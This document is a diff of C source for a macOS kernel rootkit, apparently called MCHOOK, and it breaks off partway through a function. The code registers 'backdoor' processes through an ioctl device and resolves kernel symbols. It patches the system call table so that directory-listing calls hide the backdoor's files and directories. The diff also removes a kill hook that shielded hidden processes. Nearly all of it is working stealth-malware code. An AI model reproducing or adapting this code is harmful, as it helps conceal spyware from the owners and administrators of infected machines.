@@ -29,6 +29,7 @@
 #include <sys/conf.h>
 #include <sys/attr.h>
 
+#include <AvailabilityMacros.h>
 #include <sys/ioctl.h>
 #include <miscfs/devfs/devfs.h>
 
@@ -47,8 +48,7 @@
 #define OSAX          "appleOsax"
 #define KERNEL_BASE   0xffffff8000200000 // SL 10.6.4
 
-//#define DEBUG
-
+/*#define DEBUG*/
 
 #pragma mark -
 #pragma mark Global variables
@@ -65,21 +65,17 @@ static int g_kext_hidden      = 0;
 
 // Holding current kmod entry pointer
 //static kmod_info_t *currentK;
-// Holding the real time uspace backdoor count
-static int g_backdoor_counter = 0;
-// Holding the uspace backdoor count (never decreasing)
-static int g_backdoor_counter_static = 0;
-// Holding the next free index for hiddendDirs[] (just free'd)
-static int g_next_free_index = -1;
-// Index for the s_dentries struct
-//static int g_backdoor_current = -1;
-// BSD IOCTL stuff
-static int major = -1;
-static void *devfs_handle = 0;
 
-static int g_os_major   = 0;
-static int g_os_minor   = 0;
-static int g_os_bugfix  = 0;
+// Holding the uspace backdoor count
+static int g_registered_backdoors = 0;
+
+// BSD IOCTL stuff
+static int major              = -1;
+static void *devfs_handle     = 0;
+
+static int g_os_major         = 0;
+static int g_os_minor         = 0;
+static int g_os_bugfix        = 0;
 
 static int g_symbols_resolved = 0;
 
@@ -123,24 +119,19 @@ static int cdev_ioctl(dev_t dev,
   char username[MAX_USER_SIZE];
   
   switch (cmd) {
-#pragma mark MCHOOK_INIT
     case MCHOOK_INIT: {
-#ifdef DEBUG
-      printf("[MCHOOK] MCHOOK_INIT called\n");
-#endif
       if (data) {
-        //pid_t pid = p->p_pid;
         strncpy(username, (char *)data, MAX_USER_SIZE);
 #ifdef DEBUG
-        printf("[MCHOOK] INIT FOR USER %s with pid %d\n", username, p->p_pid);
+        printf("[MCHOOK] Init for user %s with pid %d\n", username, p->p_pid);
 #endif
-        
-        backdoor_init(username, p);
+        if (backdoor_init(username, p) == FALSE) {
+#ifdef DEBUG
+          printf("[MCHOOK] Error on init\n");
+#endif
+        }
       }
-      
-      break;
-    }
-#pragma mark MCHOOK_HIDEK
+    } break;
     case MCHOOK_HIDEK: {
 #ifdef DEBUG
       printf("[MCHOOK] MCHOOK_HIDEK called\n");
@@ -156,9 +147,9 @@ static int cdev_ioctl(dev_t dev,
           
           //hide_kext_leopard();
         }
-        else if (g_os_major == 10 && g_os_minor == 6) {
+        else {
 #ifdef DEBUG
-          printf("[MCHOOK] Snow leopard not supported yet for KEXT hiding\n");
+          printf("[MCHOOK] KEXT hiding not supported yet\n");
 #endif
         }
       }
@@ -167,14 +158,12 @@ static int cdev_ioctl(dev_t dev,
         printf("[MCHOOK] Error, symbols not correctly resolved\n");
 #endif
       }
-
-      break;
-    }
-#pragma mark MCHOOK_HIDEP
+    } break;
     case MCHOOK_HIDEP: {
 #ifdef DEBUG
       printf("[MCHOOK] MCHOOK_HIDEP called\n");
 #endif
+      
       if (data && g_symbols_resolved == 1) {
         strncpy(username, (char *)data, MAX_USER_SIZE);
 #ifdef DEBUG
@@ -184,14 +173,14 @@ static int cdev_ioctl(dev_t dev,
         
         int backdoor_index = 0;
         
-        if ((backdoor_index = get_backdoor_index(p, username)) == -1) {
+        if ((backdoor_index = get_active_bd_index(username, p->p_pid)) == -1) {
 #ifdef DEBUG
-          printf("[MCHOOK] ERR: get_backdoor_index returned -1 in HIDEP\n");
+          printf("[MCHOOK] ERR: get_active_bd_index returned -1 in HIDEP\n");
 #endif
           return error;
         }
         
-        if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
+        if (g_reg_backdoors[backdoor_index]->is_proc_hidden == 1) {
 #ifdef DEBUG
           printf("[MCHOOK] ERR: Backdoor is already hidden\n");
 #endif
@@ -204,9 +193,7 @@ static int cdev_ioctl(dev_t dev,
 #endif
         }
       }
-      break;
-    };
-#pragma mark MCHOOK_HIDED
+    } break;
     case MCHOOK_HIDED: {
 #ifdef DEBUG
       printf("[MCHOOK] MCHOOK_HIDED called\n");
@@ -215,36 +202,28 @@ static int cdev_ioctl(dev_t dev,
         char dirName[MAX_DIRNAME_SIZE];
         strncpy(dirName, (char *)data, MAX_DIRNAME_SIZE);
         add_dir_to_hide(dirName, p->p_pid);
-#ifdef DEBUG
-        printf("[MCHOOK] pid (%d)\n", p->p_pid);
-#endif
       }
-      break;
-    };
-#pragma mark MCHOOK_UNREGISTER
+    } break;
     case MCHOOK_UNREGISTER: {
 #ifdef DEBUG
-      printf("[MCHOOK] MCHOOK_UNREGISTER called\n");
+      printf("[MCHOOK] MCHOOK_UNREGISTER called (%lu)\n", cmd);
 #endif
       if (data && g_symbols_resolved == 1) {
         strncpy(username, (char *)data, MAX_USER_SIZE);
         
 #ifdef DEBUG
         printf("[MCHOOK] Unregister for user: %s\n", username);
+        printf("[MCHOOK] backdoorCounter: %d\n", g_registered_backdoors);
 #endif
         
-#ifdef DEBUG
-        printf("[MCHOOK] backdoorCounter: %d\n", g_backdoor_counter);
-        printf("[MCHOOK] backdoorCounterStatic: %d\n", g_backdoor_counter_static);
-#endif
 #if 0
         //
         // g_backdoor_current could get messed up (e.g. 2 backdoors on the same machine
         // one gets uninstalled, the other is still active but there's no way
-        // for it to be refereced by g_backdoor_current, thus we call get_backdoor_index
+        // for it to be referenced by g_backdoor_current, thus we call get_active_bd_index
         //
         if (g_backdoor_current == -1) {
-          if ((g_backdoor_current = get_backdoor_index(p, username)) == -1) {
+          if ((g_backdoor_current = get_active_bd_index(p, username)) == -1) {
 #ifdef DEBUG
             printf("[MCHOOK] unregistering err - backdoor not registered?!!\n");
 #endif
@@ -260,17 +239,17 @@ static int cdev_ioctl(dev_t dev,
           unhide_proc(p);
         }
 #endif
-        int backdoor_index;
         
-        if ((backdoor_index = get_backdoor_index(p, username)) == -1) {
+        int backdoor_index;
+        if ((backdoor_index = get_active_bd_index(username, p->p_pid)) == -1) {
 #ifdef DEBUG
-          printf("[MCHOOK] ERR: get_backdoor_index returned -1 in UNREGISTER\n");
+          printf("[MCHOOK] ERR: get_active_bd_index returned -1 in UNREGISTER\n");
 #endif
           
           return error;
         }
         
-        if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
+        if (g_reg_backdoors[backdoor_index]->is_proc_hidden == 1) {
 #ifdef DEBUG
           printf("[MCHOOK] Backdoor is hidden, unhiding\n");
 #endif
@@ -280,133 +259,212 @@ static int cdev_ioctl(dev_t dev,
         //g_backdoor_current = -1;
         dealloc_meh(username, p->p_pid);
         
-        if (g_backdoor_counter == 0) {
+        if (g_registered_backdoors == 0) {
 #ifdef DEBUG
           printf("[MCHOOK] No more backdoor left, unhooking\n");
 #endif
           remove_hooks();
         }
       }
-      break;
-    };
-#pragma mark MCHOOK_GET_ACTIVES
+    } break;
     case MCHOOK_GET_ACTIVES: {
-      *data = g_backdoor_counter;
-      break;
-    };
-#pragma mark MCHOOK_SOLVE_SYM
-    case MCHOOK_SOLVE_SYM: {
+      *data = g_registered_backdoors;
+    } break;
+#if __LP64__ || NS_BUILD_32_LIKE_64
+    case MCHOOK_SOLVE_SYM_64: {
 #ifdef DEBUG
-      printf("[MCHOOK] MCHOOK_SOLVE_SYM called\n");
+      printf("[MCHOOK] MCHOOK_SOLVE_SYM_64\n");
 #endif
       
-      if (data) {
-        symbol_t *syms = (symbol_t *)data;
-        
+      symbol64_t *syms = (symbol64_t *)data;
+      
 #ifdef DEBUG
-        printf("[MCHOOK] hash   : 0x%08x\n", syms->hash);
-        printf("[MCHOOK] symbol : 0x%08x\n", syms->symbol);
+      printf("[MCHOOK] hash    : 0x%llx\n", syms->hash);
+      printf("[MCHOOK] address : 0x%llx\n", syms->address);
 #endif
-        if (g_symbols_resolved == 1)
-          return error;
-        
-        switch (syms->hash) {
-          case KMOD_HASH: {
+      
+      if (g_symbols_resolved == 1)
+        return error;
+      
+      switch (syms->hash) {
+        case KMOD_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] kmod symbol received\n");
+          printf("[MCHOOK] kmod symbol received\n");
 #endif
-            i_kmod = (kmod_info_t *)syms->symbol;
-            break;
-          }
-          case NSYSENT_HASH: {
+          i_kmod = (kmod_info_t *)syms->address;
+        } break;
+        case NSYSENT_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] nsysent symbol received\n");
+          printf("[MCHOOK] nsysent symbol received\n");
 #endif
-            i_nsysent = (int *)syms->symbol;
+          i_nsysent = (int *)syms->address;
 #ifdef DEBUG
-            printf("[MCHOOK] nsysent: %d\n", *i_nsysent);
+          printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
 #endif
-            break;
-          }
-          case TASKS_HASH: {
+        } break;
+        case TASKS_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] tasks symbol received\n");
+          printf("[MCHOOK] tasks symbol received\n");
 #endif
-            i_tasks = (queue_head_t *)syms->symbol;
-            break;
-          }
-          case ALLPROC_HASH: {
+          i_tasks = (queue_head_t *)syms->address;
+        } break;
+        case ALLPROC_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] allproc symbol received\n");
+          printf("[MCHOOK] allproc symbol received\n");
 #endif
-            i_allproc = (struct proclist *)syms->symbol;
-            break;
-          }
-          case TASKS_COUNT_HASH: {
+          i_allproc = (struct proclist *)syms->address;
+        } break;
+        case TASKS_COUNT_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] tasks_count symbol received\n");
+          printf("[MCHOOK] tasks_count symbol received\n");
 #endif
-            i_tasks_count = (int *)syms->symbol;
-            break;
-          }
-          case NPROCS_HASH: {
+          i_tasks_count = (int *)syms->address;
+        } break;
+        case NPROCS_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] nprocs symbol received\n");
+          printf("[MCHOOK] nprocs symbol received\n");
 #endif
-            i_nprocs = (int *)syms->symbol;
-            break;
-          }
-          case TASKS_THREADS_LOCK_HASH: {
+          i_nprocs = (int *)syms->address;
+        } break;
+        case TASKS_THREADS_LOCK_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] tasks_threads_lock symbol received\n");
+          printf("[MCHOOK] tasks_threads_lock symbol received\n");
 #endif
-            i_tasks_threads_lock = (lck_mtx_t *)syms->symbol;
-            break;
-          }
-          case PROC_LOCK_HASH: {
+          i_tasks_threads_lock = (lck_mtx_t *)syms->address;
+        } break;
+        case PROC_LOCK_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] proc_lock symbol received\n");
+          printf("[MCHOOK] proc_lock symbol received\n");
 #endif
-            i_proc_lock = (void *)syms->symbol;
-            break;
-          }
-          case PROC_UNLOCK_HASH: {
+          i_proc_lock = (void *)syms->address;
+        } break;
+        case PROC_UNLOCK_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] proc_unlock symbol received\n");
+          printf("[MCHOOK] proc_unlock symbol received\n");
 #endif
-            i_proc_unlock = (void *)syms->symbol;
-            break;
-          }
-          case PROC_LIST_LOCK_HASH: {
+          i_proc_unlock = (void *)syms->address;
+        } break;
+        case PROC_LIST_LOCK_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] proc_list_lock symbol received\n");
+          printf("[MCHOOK] proc_list_lock symbol received\n");
 #endif
-            i_proc_list_lock = (void *)syms->symbol;
-            break;
-          }
-          case PROC_LIST_UNLOCK_HASH: {
+          i_proc_list_lock = (void *)syms->address;
+        } break;
+        case PROC_LIST_UNLOCK_HASH: {
 #ifdef DEBUG
-            printf("[MCHOOK] proc_list_unlock symbol received\n");
+          printf("[MCHOOK] proc_list_unlock symbol received\n");
 #endif
-            i_proc_list_unlock = (void *)syms->symbol;
-            break;
-          }
-          default: {
+          i_proc_list_unlock = (void *)syms->address;
+        } break;
+        default: {
 #ifdef DEBUG
-            printf("[MCHOOK] symbol not supported yet\n");
+          printf("[MCHOOK] symbol not supported yet\n");
 #endif
-            break;
-          }
-        }
+        } break;
       }
-      break;
-    };
-#pragma mark MCHOOK_FIND_SYS
+    } break;
+#else
+    case MCHOOK_SOLVE_SYM_32: {
+#ifdef DEBUG
+      printf("[MCHOOK] MCHOOK_SOLVE_SYM_32\n");
+#endif
+      
+      symbol32_t *syms = (symbol32_t *)data;
+      
+#ifdef DEBUG
+      printf("[MCHOOK] hash    : 0x%x\n", syms->hash);
+      printf("[MCHOOK] address : 0x%x\n", syms->address);
+#endif
+      if (g_symbols_resolved == 1)
+        return error;
+
+      switch (syms->hash) {
+        case KMOD_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] kmod symbol received\n");
+#endif
+          i_kmod = (kmod_info_t *)syms->address;
+        } break;
+        case NSYSENT_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] nsysent symbol received\n");
+#endif
+          i_nsysent = (int *)syms->address;
+#ifdef DEBUG
+          printf("[MCHOOK] nsysent: %ld\n", (long int)*i_nsysent);
+#endif
+        } break;
+        case TASKS_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] tasks symbol received\n");
+#endif
+          i_tasks = (queue_head_t *)syms->address;
+        } break;
+        case ALLPROC_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] allproc symbol received\n");
+#endif
+          i_allproc = (struct proclist *)syms->address;
+        } break;
+        case TASKS_COUNT_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] tasks_count symbol received\n");
+#endif
+          i_tasks_count = (int *)syms->address;
+        } break;
+        case NPROCS_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] nprocs symbol received\n");
+#endif
+          i_nprocs = (int *)syms->address;
+        } break;
+        case TASKS_THREADS_LOCK_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] tasks_threads_lock symbol received\n");
+#endif
+          i_tasks_threads_lock = (lck_mtx_t *)syms->address;
+        } break;
+        case PROC_LOCK_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] proc_lock symbol received\n");
+#endif
+          i_proc_lock = (void *)syms->address;
+        } break;
+        case PROC_UNLOCK_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] proc_unlock symbol received\n");
+#endif
+          i_proc_unlock = (void *)syms->address;
+        } break;
+        case PROC_LIST_LOCK_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] proc_list_lock symbol received\n");
+#endif
+          i_proc_list_lock = (void *)syms->address;
+        } break;
+        case PROC_LIST_UNLOCK_HASH: {
+#ifdef DEBUG
+          printf("[MCHOOK] proc_list_unlock symbol received\n");
+#endif
+          i_proc_list_unlock = (void *)syms->address;
+        } break;
+        default: {
+#ifdef DEBUG
+          printf("[MCHOOK] symbol not supported yet\n");
+#endif
+        } break;
+      }
+    } break;
+#endif
     case MCHOOK_FIND_SYS: {
 #ifdef DEBUG
       printf("[MCHOOK] MCHOOK_FIND_SYS called\n");
 #endif
-      if (data) {
+      
+      if (data && check_symbols_integrity() == 1) {
+#ifdef DEBUG
+        printf("[MCHOOK] symbols resolved\n");
+#endif
         os_version_t *os_ver = (os_version_t *)data;
         g_os_major  = os_ver->major;
         g_os_minor  = os_ver->minor;
@@ -420,29 +478,24 @@ static int cdev_ioctl(dev_t dev,
 #endif
         }
         else {
-          if (check_symbols_integrity()) {
 #ifdef DEBUG
-            printf("[MCHOOK] All symbols were resolved\n");
+          printf("[MCHOOK] All symbols were resolved and sysent found\n");
 #endif
-            place_hooks();
-          }
-          else {
-#ifdef DEBUG
-            printf("[MCHOOK] Some symbols were not resolved\n");
-#endif
-          }
+          place_hooks();
         }
-
       }
-      break;
-    }
+      else {
+#ifdef DEBUG
+        printf("[MCHOOK] No data or symbols not resolved (%d)\n", g_symbols_resolved);
+#endif
+      }
+    } break;
     default: {
 #ifdef DEBUG
       printf("[MCHOOK] Unknown command called dudeeeee: %lu\n", cmd);
 #endif
       error = EINVAL;
-      break;
-    };
+    } break;
   }
   
   return error;
@@ -476,13 +529,13 @@ int hook_getdirentries(struct proc *p,
       length = current->d_reclen;
       count -= length;
       
-      for (i_entry = 0; i_entry < g_backdoor_counter_static; i_entry++) {
+      for (i_entry = 0; i_entry < g_registered_backdoors; i_entry++) {
         //
         // Enforce checks in order to avoid situation where all the files are hidden
         // from the disk since the g_reg_backdoors structure is inconsistent
         //
-        if (g_reg_backdoors[i_entry]->isActive == 1) {
-          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->pathCounter; i_path++) {
+        if (g_reg_backdoors[i_entry]->is_active == 1) {
+          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->path_counter; i_path++) {
             if (strncmp(g_reg_backdoors[i_entry]->path[i_path], "",
                         strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0)
               continue;
@@ -560,13 +613,13 @@ int hook_getdirentries64(struct proc *p,
       length = current->d_reclen;
       count -= length;
 
-      for (i_entry = 0; i_entry < g_backdoor_counter_static; i_entry++) {
+      for (i_entry = 0; i_entry < g_registered_backdoors; i_entry++) {
         //
         // Enforce checks in order to avoid situation where all the files are hidden
         // from the disk since the g_reg_backdoors structure is inconsistent
         //
-        if (g_reg_backdoors[i_entry]->isActive == 1) {
-          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->pathCounter; i_path++) {
+        if (g_reg_backdoors[i_entry]->is_active == 1) {
+          for (i_path = 0; i_path < g_reg_backdoors[i_entry]->path_counter; i_path++) {
             if (strncmp(g_reg_backdoors[i_entry]->path[i_path], "",
                         strlen(g_reg_backdoors[i_entry]->path[i_path])) == 0)
               continue;
@@ -623,7 +676,7 @@ int hook_getdirentriesattr(struct proc *p,
                            struct mk_getdirentriesattr_args *uap,
                            int *retval)
 {
-  char procName[20];
+  char procname[20];
   char *curr_entry = NULL;
   
   attr_list_t al;
@@ -635,22 +688,24 @@ int hook_getdirentriesattr(struct proc *p,
   u_int32_t count         = 0;
   u_int32_t entry_size    = 0;
   
-  attribute_buffer_t *buf, *thisEntry;
+  /*attribute_buffer_t *buf, *this_entry;*/
+  FInfoAttrBuf *this_entry;
+  char *buf;
 
   success = real_getdirentriesattr(p, uap, retval);
-  proc_name(p->p_pid, procName, sizeof(procName));
+  proc_name(p->p_pid, procname, sizeof(procname));
   
 #ifdef DEBUG_VERBOSE
-  printf("p_start sec: %d for %s\n", (int)p->p_start.tv_sec, procName);
+  printf("p_start sec: %d for %s\n", (int)p->p_start.tv_sec, procname);
 #endif
   
   if (check_for_process_exclusions(p->p_pid) == -1) {
 #ifdef DEBUG_VERBOSE
-    printf("getdirentriesattr called by %s\n", procName); 
+    printf("getdirentriesattr called by %s\n", procname); 
     printf("ATTRLIST - %s commonattr %08x | volattr %08x | fileattr %08x | dirattr %08x | forkattr %08x | %sfollow\n",
            p->p_comm, al.commonattr, al.volattr, al.fileattr, al.dirattr, al.forkattr,
            (uap->options & FSOPT_NOFOLLOW) ? "no" : "");
-    //getAttributesForBitFields(al);
+    getAttributesForBitFields(al);
 #endif
     
     copyin(uap->alist, (caddr_t)&al, sizeof(al));
@@ -660,74 +715,103 @@ int hook_getdirentriesattr(struct proc *p,
     printf("bufferSize: %d\n", (int)uap->buffersize);
 #endif
     
-    MALLOC(buf, attribute_buffer_t *, uap->buffersize, MK_MBUF, M_WAITOK);
+    /*MALLOC(buf, attribute_buffer_t *, uap->buffersize, MK_MBUF, M_WAITOK);*/
+    MALLOC(buf, char *, uap->buffersize, MK_MBUF, M_WAITOK);
     copyin(uap->buffer, (caddr_t)buf, uap->buffersize);
     
-    thisEntry = (attribute_buffer_t *)(char *)buf;
+    /*this_entry = (attribute_buffer_t *)(char *)buf;*/
+    this_entry = (FInfoAttrBuf *)buf;
     
     int _tmp_size = uap->buffersize;
     index = count;
     
+#ifdef DEBUG_VERBOSE
+    printf("[MCHOOK] _tmp_size start : %d\n", _tmp_size);
+    printf("[MCHOOK] index     start : %d\n", index);
+#endif
+
     while (_tmp_size > 0 && index > 0) {
-      entry_size = thisEntry->length;
+      entry_size = this_entry->length;
+      curr_entry = (char *)&this_entry->name;
+      curr_entry += this_entry->name.attr_dataoffset;
+
+#ifdef DEBUG_VERBOSE
+      printf("[MCHOOK] curr_entry st  : %llx\n", (unsigned long long)curr_entry);
+      printf("[MCHOOK] data offset st : %x\n", this_entry->name.attr_dataoffset);
+      printf("[MCHOOK] _tmp_size st   : %x\n", _tmp_size);
+      printf("[MCHOOK] index st       : %d\n", index);
+#endif
+
+      if (this_entry->name.attr_dataoffset > 0) {
+        for (curr_backdoor = 0; curr_backdoor < g_registered_backdoors; curr_backdoor++) {
+          //
+          // Enforce checks in order to avoid situation where all the files are hidden
+          // from the disk since the g_reg_backdoors structure is inconsistent
+          //
+          if (g_reg_backdoors[curr_backdoor]->is_active == 1) {
+            for (curr_path = 0;
+                 curr_path < g_reg_backdoors[curr_backdoor]->path_counter;
+                 curr_path++) {
+#ifdef DEBUG_VERBOSE
+              printf("[MCHOOK] curr_entry f  : %llx\n", (unsigned long long)curr_entry);
+              printf("[MCHOOK] g_curr_entry f: %s\n", g_reg_backdoors[curr_backdoor]->path[curr_path]);
+#endif
+              if (strncmp(g_reg_backdoors[curr_backdoor]->path[curr_path],
+                          "",
+                          strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0)
+                continue;
+
+              if (strncmp(curr_entry,
+                          g_reg_backdoors[curr_backdoor]->path[curr_path],
+                          strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0) {
+                if ((strncmp(curr_entry, IM, strlen(IM)) == 0)
+                    || (strncmp(curr_entry, OSAX, strlen(OSAX)) == 0)) {
+                  if (p->p_start.tv_sec == 0) {
+#ifdef DEBUG
+                    printf("Entry matched for %s (first time) - skipping\n", curr_entry);
+#endif
+                    p->p_start.tv_sec = 1;
+                    continue;
+                  }
+                }
+#ifdef DEBUG_VERBOSE
+                printf("%s REQUESTED %s\n", procname, curr_entry);
+#endif
+
+                // Remove the entry from buf
+                memmove((char *)this_entry,
+                        (char *)((NSUInteger)this_entry + entry_size),
+                        _tmp_size);
+                flag = 1;
+
+                // Adjust the counter since we removed an entry
+                count--;
+
+                break;
+              }
+            }
+          }
+
+          if (flag)
+            break;
+        }
+      }
+      else {
+#ifdef DEBUG_VERBOSE
+        printf("[MCHOOK] dataoffset is 0\n");
+#endif
+      }
+
       _tmp_size -= entry_size;
       index -= 1;
       
-      curr_entry = (char *)&thisEntry->name;
-      curr_entry += (unsigned int)thisEntry->name.attr_dataoffset;
-      
-      for (curr_backdoor = 0; curr_backdoor < g_backdoor_counter_static; curr_backdoor++) {
-        //
-        // Enforce checks in order to avoid situation where all the files are hidden
-        // from the disk since the g_reg_backdoors structure is inconsistent
-        //
-        if (g_reg_backdoors[curr_backdoor]->isActive == 1) {
-          for (curr_path = 0; curr_path < g_reg_backdoors[curr_backdoor]->pathCounter; curr_path++) {
-            if (strncmp(g_reg_backdoors[curr_backdoor]->path[curr_path],
-                        "",
-                        strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0)
-              continue;
-            
-            if (strncmp(curr_entry,
-                        g_reg_backdoors[curr_backdoor]->path[curr_path],
-                        strlen(g_reg_backdoors[curr_backdoor]->path[curr_path])) == 0) {
-              if ((strncmp(curr_entry, IM, strlen(IM)) == 0)
-                 || (strncmp(curr_entry, OSAX, strlen(OSAX)) == 0)) {
-                if (p->p_start.tv_sec == 0) {
-#ifdef DEBUG
-                  printf("Entry matched for %s (first time) - skipping\n", curr_entry);
-#endif
-                  
-                  p->p_start.tv_sec = 1;
-                  
-                  continue;
-                }
-              }
-#ifdef DEBUG
-              printf("%s REQUESTED %s\n", procName, curr_entry);
-#endif
-              
-              // Remove the entry from buf
-              memmove((char *)thisEntry,
-                      (char *)((unsigned int)thisEntry + entry_size),
-                      _tmp_size);
-              flag = 1;
-              
-              // Adjust the counter since we removed an entry
-              count--;
-              
-              break;
-            }
-          }
-        }
-        
-        if (flag)
-          break;
-      }
-
       // Advance to the next entry
-      if (_tmp_size != 0 && flag == 0)
-        thisEntry = (attribute_buffer_t *)((unsigned int)thisEntry + entry_size);
+      /*if (_tmp_size != 0 && flag == 0)*/
+        /*this_entry = (attribute_buffer_t *)((NSUInteger)this_entry + entry_size);*/
+      if (_tmp_size > 0 && flag == 0) {
+        char *z = ((char *)this_entry) + entry_size;
+        this_entry = (FInfoAttrBuf *)z;
+      }
     }
     
     // Back to uspace
@@ -738,50 +822,12 @@ int hook_getdirentriesattr(struct proc *p,
   }
   else {
 #ifdef DEBUG
-    printf("Process excluded from hiding: %s\n", procName);
+    printf("Process excluded from hiding: %s\n", procname);
 #endif
   }
   
   return success;
 }
-
-int hook_kill(struct proc *p,
-              struct mk_kill_args *uap,
-              int *retval)
-{
-	int i = 0;
-  
-  for (; i < g_backdoor_counter_static; i++) {
-    if (g_reg_backdoors[i]->isActive        == 1
-        && g_reg_backdoors[i]->isProcHidden == 1
-        && g_reg_backdoors[i]->p->p_pid     == uap->pid) {
-      return 0;
-    }
-  }
-  
-  return real_kill(p, uap, retval);
-}
-  
-#if 0
-int hook_read(struct proc *p,
-              struct mk_read_args *uap,
-              int *retval)
-{
-  int error;
-  char buf[1];
-  size_t *done;
-
-  error = real_read(p, uap, retval);
-  if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)) {
-      return(error);
-  }
-  copyinstr(uap->cbuf, buf, 1, done);
-#ifdef DEBUG
-  printf("%c\n", buf[0]);
-#endif
-  return (error);
-}
-#endif
 
 #pragma mark -
 #pragma mark General purpose functions
@@ -848,7 +894,6 @@ void getAttributesForBitFields(attr_list_t al)
   if (al.commonattr & ATTR_CMN_VOLSETMASK)
     printf("ATTR_CMN_VOLSETMASK\n");
   
-  
   // volattr checks
   if (al.volattr & ATTR_VOL_FSTYPE)
     printf("ATTR_VOL_FSTYPE\n");
@@ -905,16 +950,16 @@ void getAttributesForBitFields(attr_list_t al)
 
 int check_for_process_exclusions(pid_t pid)
 {
-  char procName[20];
+  char procname[20];
   int i = 0;
   
-  proc_name(pid, procName, sizeof(procName));
+  proc_name(pid, procname, sizeof(procname));
   
   for (i = 0; i < g_process_excluded; i ++) {
-    if (strncmp(procName, g_exclusion_list[i].processName, MAX_USER_SIZE) == 0
-        && g_exclusion_list[i].isActive == 1) {
+    if (strncmp(procname, g_exclusion_list[i].processname, MAX_USER_SIZE) == 0
+        && g_exclusion_list[i].is_active == 1) {
 #ifdef DEBUG
-      printf("[MCHOOK] Exclusion matched for %s\n", procName);
+      printf("[MCHOOK] Exclusion matched for %s\n", procname);
 #endif
       return 1;
     }
@@ -943,12 +988,6 @@ void place_hooks()
     fl_getdirentriesattr = 1;
   }
   
-  if (fl_kill == 0) {
-    real_kill = (kill_func_t *)_sysent[SYS_kill].sy_call;
-    _sysent[SYS_kill].sy_call = (sy_call_t *)hook_kill;
-    fl_kill = 1;
-  }
-  
 #ifdef DEBUG
   printf("[MCHOOK] Hooks in place\n");
 #endif
@@ -970,160 +1009,125 @@ void remove_hooks()
     _sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)real_getdirentriesattr;
     fl_getdirentriesattr = 0;
   }
-  
-  if (fl_kill) {
-    _sysent[SYS_kill].sy_call = (sy_call_t *)real_kill;
-    fl_kill = 0;
-  }
 }
 
-void add_dir_to_hide(char *dirName, pid_t pid)
+void add_dir_to_hide(char *dirname, pid_t pid)
 {
   int i = 0;
   int z = 0;
   
 #ifdef DEBUG
-  printf("[MCHOOK] addDirToHide called\n");
-  printf("[MCHOOK] Hiding (%s) for pid (%d)\n", dirName, pid);
+  printf("[MCHOOK] Hiding (%s) for pid (%d)\n", dirname, pid);
 #endif
   
-  for (i = 0; i < g_backdoor_counter_static; i++) {
-    if (g_reg_backdoors[i]->pid == pid
-        && g_reg_backdoors[i]->isActive == 1) {
-      for (z = 0; z < g_reg_backdoors[i]->pathCounter; z ++) {
-        if (strncmp(dirName, g_reg_backdoors[i]->path[z], MAX_DIRNAME_SIZE) == 0) {
+  for (i = 0; i < g_registered_backdoors; i++) {
+    if (g_reg_backdoors[i]->p->p_pid      == pid
+        && g_reg_backdoors[i]->is_active  == 1) {
+      for (z = 0; z < g_reg_backdoors[i]->path_counter; z ++) {
+        if (strncmp(dirname, g_reg_backdoors[i]->path[z], MAX_DIRNAME_SIZE) == 0) {
 #ifdef DEBUG
-          printf("[MCHOOK] Path already registered (%s)!\n", dirName);
+          printf("[MCHOOK] Path already registered (%s)!\n", dirname);
 #endif
                   
           return;
         }
       }
       
-      if (g_reg_backdoors[i]->pathCounter < MAX_PATH_ENTRIES) {
-        strncpy((char *)g_reg_backdoors[i]->path[g_reg_backdoors[i]->pathCounter],
-                dirName, MAX_DIRNAME_SIZE);
+      int pcounter = g_reg_backdoors[i]->path_counter;
+      if (g_reg_backdoors[i]->path_counter < MAX_PATH_ENTRIES) {
+        strncpy((char *)g_reg_backdoors[i]->path[pcounter],
+                dirname,
+                MAX_DIRNAME_SIZE);
         
 #ifdef DEBUG
-        printf("[MCHOOK] DIR Hidden: %s\n", g_reg_backdoors[i]->path[g_reg_backdoors[i]->pathCounter]);
+        printf("[MCHOOK] DIR Hidden: %s\n", g_reg_backdoors[i]->path[pcounter]);
 #endif
-        
-        g_reg_backdoors[i]->pathCounter++;
-        
+        g_reg_backdoors[i]->path_counter++;
 #ifdef DEBUG
-        printf("[MCHOOK] backdoorCounter: %d\n", g_backdoor_counter);
+        printf("[MCHOOK] backdoorCounter: %d\n", g_registered_backdoors);
         printf("[MCHOOK] backdoor pathCounter: %d\n", 
-               g_reg_backdoors[i]->pathCounter);
+               g_reg_backdoors[i]->path_counter);
 #endif
       }
     }
   }
 }
 
-void backdoor_init(char *userName, proc_t p)
+Boolean
+backdoor_init(char *username, proc_t p)
 {
-  // TODO: I should add here any further authentication/registration method
-  int _index        = 0;
-  int i             = 0;
-  int backdoorFound = -1;
+  int _index      = 0;
+  int i           = 0;
+  int bd_index    = -1;
+  Boolean result  = FALSE;
   
